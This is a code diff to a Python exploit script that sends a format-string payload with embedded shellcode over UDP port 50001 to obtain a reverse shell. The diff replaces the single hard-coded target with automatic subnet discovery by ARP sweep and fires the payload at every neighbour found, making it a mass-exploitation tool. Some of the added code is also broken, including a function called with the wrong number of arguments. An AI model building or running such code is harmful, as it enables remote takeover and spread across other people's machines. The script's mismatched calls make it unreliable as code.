@@ -10,9 +10,40 @@
 import struct
 import socket
 import sys
+import ipaddress
+import netifaces as ni
+from scapy.all import ARP, srp
 
-ip = '10.0.2.15'
-port = 50001
+# Function to check if a port is open on a given IP
+def is_port_open(ip, port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(1)  # Timeout of 1 second
+    try:
+        sock.connect((ip, port))
+        return True
+    except (socket.timeout, socket.error):
+        return False
+    finally:
+        sock.close()
+
+# Function to get the network and subnet mask of the primary interface
+def get_network():
+    gateways = ni.gateways()
+    default_gateway = gateways['default'][ni.AF_INET][1]
+    interface = gateways['default'][ni.AF_INET][1]
+    addr = ni.ifaddresses(interface)[ni.AF_INET][0]
+    network = ipaddress.IPv4Network((addr['addr'], addr['netmask']), strict=False)
+    return network
+
+def get_arp_neighbors(interface):
+    # Create an ARP request packet
+    arp_request = ARP(pdst='255.255.255.255')
+    # Send the packet and get the responses
+    answered, _ = srp(arp_request, iface=interface, timeout=1, verbose=False)
+    
+    # Extract the IP addresses from the responses
+    neighbors = [rcv.psrc for snd, rcv in answered]
+    return neighbors
 
 def gen_discover_packet(ad_id, os, hn, user, inf, func):
     d  = bytes([0x3e, 0xd1, 0x1])
@@ -64,14 +95,24 @@ shellcode += b"\xa0\xef\xec\x5f\xd4\xda\x02\x8c\xa3\xba\x9b"
 shellcode += b"\xb5\xf4\x61\x7e\xa6\x43\x33\xe6\x91\xd4\xe8"
 shellcode += b"\xcb\xe1\xcf\xd4\xb4\xc6\x9c\x61\x2d"
 
-print('sending payload ...')
-p = gen_discover_packet(4919, 1, b'\x85\xfe%1$*1$x%18x%165$ln' + shellcode, b'\x85\xfe%18472249x%93$ln', 'ad', 'main')
+# Example usage
+try:
+    network = get_network()  # Automatically get the network to scan
+    port = 50001  # Define the port to scan
+    open_ports = get_arp_neighbors(network, port)
 
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-s.sendto(p, (ip, port))
-s.close()
-print('reverse shell should connect within 5 seconds')
-            
+    for ip in open_ports:
+        print(f"IP: {ip}, Port: {port}")
+        print('sending payload ...')
+        p = gen_discover_packet(4919, 1, b'\x85\xfe%1$*1$x%18x%165$ln' + shellcode, b'\x85\xfe%18472249x%93$ln', 'ad', 'main')
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.sendto(p, (ip, port))
+        s.close()
+        print('reverse shell should connect within 5 seconds')
+except Exception as e:
+    exit()
+   
+           
 #def run():
 #    next_action = ""
 #    data = ""
